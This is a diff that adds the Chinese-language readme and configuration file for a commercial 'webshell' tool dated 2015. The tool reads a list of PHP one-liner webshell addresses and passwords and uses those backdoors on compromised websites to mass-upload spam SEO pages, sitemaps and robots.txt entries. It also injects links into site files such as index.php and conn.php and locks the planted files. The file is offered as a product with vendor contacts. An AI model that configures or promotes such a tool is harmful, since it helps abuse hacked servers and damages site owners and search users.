@@ -1,0 +1,72 @@
+------------------webshell  本地繁殖多线程自动上传V1.0-----------------
+----------------------本软件目前只支持PHP一句话------------------------
+        软件使用方法   main.exe webshell.txt   软件名 扫描URL
+        webshell.txt  内容一行一条      一句话地址|密码
+--------------------更多配置参数请看     软件说明.txt------------------
+--http://webshellseo.com--客服QQ:315284666--技术支持QQ:2602159946-----
+-----------------       time:---2015.4.25     ------------------------
+----------------------------------------------------------------------
+
+webshell  本地繁殖多线程自动上传V1.0  带自动挂链SEO功能
+本软件目前只支持PHP一句话
+
+/目录文件说明
+php_ok.txt      PHP一句话链接成功
+php_no.txt	PHP一句话链接失败
+asp_ok.txt	ASP一句话链接成功
+asp_no.txt	ASP一句话链接失败
+null.txt	无法判断要怎么做操
+
+data  目录说明
+data/content.txt   文章内容
+data/key.txt       关键字
+data/links.txt     外链
+data/tmkeyword2.txt  网站名称会随机抽取1条
+data/video.txt     视频地址
+data/mb            模板存放路径
+
+log  日志
+log/add_no.txt   上传失败
+log/add_ok.txt	 上传成功
+log/links.txt	 上传成功的页面|标题
+log/add_xml_ok.txt 生成的XML站点地图
+
+[DATA] ;配置文件
+thread=10  ;主线程数同时操作多少个WEBSHELL
+thread_link=50  ;子线程数  批量上传
+
+[PLSH] ;批量上传配置文件
+index_int=350  ;生成文件篇数
+ul_li_list=30  ;主页每页多少条数据
+mb_path=data/mb/zhidao/|data/mb/DEDE/|data/mb/mb1/  ;模板路径
+name_id=0  ;内页路径名规则  规则0 随机抽取123规则--规则1 20150424 时间文件名--规则2 sadfa 字符3-7位拼音--规则3 42342 数字3-7位拼音
+
+[shell_seo] ;批量挂链接
+shell_seo_bool=1 ;是否开启此功能
+file_name_fa=1  ;设置要修改的方法
+file_name1=index.htm|index.html|index.php|conn.php|data/common.inc.php  ;指定目录修改文件名
+file_name2=index.htm|Index.htm|index.html|Index.html|Default.htm|Default.html|index.php|forum.php|conn.php|CONN.php|home.php|common.inc.php|global.php   ;遍历要修改文件名
+thread_link=5  ;子线程数
+nl_link_int=2	;内链多少条
+wl_link_int=2  ;外链多少条
+
+软件会自动遍历主目录下可上传文件目录路径
+先单线程上传模板
+写入路径自动加 robots.txt  优化
+写入sitemap.xml  优化
+在多线程上传繁殖页(有权限情况下上传成功自动锁文件)
+繁殖后会自动添加到  log/add_ok.txt   log/links.txt  data/links.txt(自动会加入下次轮训)
+添加到data/links.txt   可以自动在下个WEBSHELL中进行轮链
+
+模板规则   看 模板变量规则.txt
+
+
+
+
+
+
+
+
+
+
+
